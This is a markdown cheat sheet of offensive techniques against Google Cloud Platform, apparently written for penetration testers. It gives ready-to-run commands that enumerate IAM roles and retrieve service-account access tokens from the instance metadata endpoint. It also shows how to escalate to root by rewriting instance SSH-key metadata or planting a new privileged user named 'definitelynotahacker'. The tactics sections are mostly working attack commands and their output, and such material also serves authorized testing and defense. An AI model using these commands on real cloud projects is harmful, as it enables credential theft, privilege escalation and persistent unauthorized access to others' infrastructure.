# Overview
## How do attackers gain access to GCP?
* 3rd Parties
	A 3rd party is doing malicious things that you are unaware of
	A 3rd party you trust is compromised
* Git Repositories
	Misconfigured repositories leaking sensitive data
	Mistakes in commits, publishing sensitive data
* Application/Server Level Vulnerabilities
	Credentials stored locally stolen through local file inclusion (LFI) or remote code execution (RCE)
	Credentials stolen through a servers metadata through server-side request forgery (SSRF) or RCE
* Password Reuse
	An old 3rd party database is compromised, your users are still using a compromised password
	Users using the same password across many accounts
* Social Engineering
	Phishing emails or pretext calls
	Physical vectors
* Internal Employees
	Employees getting compromised, then bringing that to your environment
	Employee mistakes leading to unintended consequences

## Comon atacks
* Escalation controls for all members with access to your environment.
* Lack of privilege assessment
* Analysis and exploitation of the Kubernetes engine configuration.
* Security mechanisms testing.
* Best practices analysis: event logs / Stackdriver monitoring, encryption, built-in security tools, etc.
* External perimeter assessment testing
* Elevation of privileges and abuse between users / projects
* Revision of cloud configurations and code of cloud functions
* Pivoting between cloud environments. (abuse of multi-cloud approvals)

## GCP basic structure
Organization
--> Folders
  --> Projects
    --> Resources

# Tactics
## Gathering
* Inspect Metadata endpoint
   169.254.169.254 metadata.google.internal
   Example: curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
* Default SA on compute Engine
	Every GCP project has a default service account, and this will be assigned to new Compute Instances unless otherwise specified
	```gcloud auth list```
	Default looks like:
		PROJECT_NUMBER-compute@developer.gserviceaccount.com
		PROJECT_ID@appspot.gserviceaccount.com
	Custom looks like:
		SERVICE_ACCOUNT_NAME@PROJECT_NAME.iam.gserviceaccount.com
* See what scopes are assigned by querying the metadata URL
	``` curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \
    -H 'Metadata-Flavor:Google' ```
    - with no scope limitations: https://www.googleapis.com/auth/cloud-platform
* Enumerate roles assigned to your service account project-wide in the current project:
    Long:
	``` 
	PROJECT=$(curl http://metadata.google.internal/computeMetadata/v1/project/project-id -H "Metadata-Flavor: Google" -s)
    ACCOUNT=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email -H "Metadata-Flavor: Google" -s)
    gcloud projects get-iam-policy $PROJECT --flatten="bindings[].members" --format='table(bindings.role)' --filter="bindings.members:$ACCOUNT"
	```
	Short:
	``` gcloud projects get-iam-policy [PROJECT-ID] ```
	``` gcloud compute instances get-iam-policy [INSTANCE] --zone [ZONE] ```
* Retrieve and inspect the token:
  ``` 
  curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"
  ```

## Local privilege escalation
* Modifying the metadata
	- Whit Default service account:
		> Web management console offers the following options for access scopes: 
				Allow default access (default)
				Allow full access to all Cloud APIs
				Set access for each API
		¡¡If option 2 was selected, or option 3 while explicitly allowing access to the compute API, then this configuration is vulnerable to escalation!!
	- Whit Custom service account:
		> One of the following IAM permissions is necessary to escalate privileges:
				compute.instances.setMetadata (to affect a single instance)
				compute.projects.setCommonInstanceMetadata (to affect all instances in the project)
* Add SSH keys to custom metadata
	- LCheck the instance for existing SSH keys. Pick one of these users as they are likely to have sudo rights.
	``` gcloud compute instances describe [INSTANCE] --zone [ZONE] ```
	- Look for somthig like:
	```
	metadata:
	   fingerprint: QCZfVTIlKgs=
	   items:
	   ...
	   - key: ssh-keys
	     value: |-
	       [USERNAME]:ssh-rsa AAAAB3NzaC1yc ............
	```
    - Save the lines with usernames and keys in a new text file called meta.txt
    - Generate a new key for ourselves like this:
    ```ssh-keygen -t rsa -C "[USERNAME]" -f ./key -P "" && cat ./key.pub```
    - Take the output of the command above and use it to add a line to the meta.txt file you create above, ensuring to add [username]: to the beggining of your new public key.
    - re-write the SSH key metadata for your instance with the following command:
    ```
    gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
    ```
    - You can now access a shell in the context of alice as follows:
    ``` lowpriv@instance:~$ ssh -i ./key [USERNAME]@localhost `
	[USERNAME]@instance:~$ sudo id
	uid=0(root) gid=0(root) groups=0(root)
	```
* Create a new privileged user
	- define the new account username
     ```NEWUSER="definitelynotahacker"```
	- create a key
	```ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""```
	- create the input meta file
	```NEWKEY="$(cat ./key.pub)"
	echo "$NEWUSER:$NEWKEY" > ./meta.txt```
	- update the instance metadata
	```gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt```
	- ssh to the new account
	```ssh -i ./key "$NEWUSER"@localhost```

* Using OS Login
	- OS Login is enabled at the project or instance level using the metadata key of enable-oslogin = TRUE
	- OS Login with two-factor authentication is enabled in the same manner with the metadata key of enable-oslogin-2fa = TRUE

## Lateral movement
* List more VM ``` gcloud compute instances lis ```
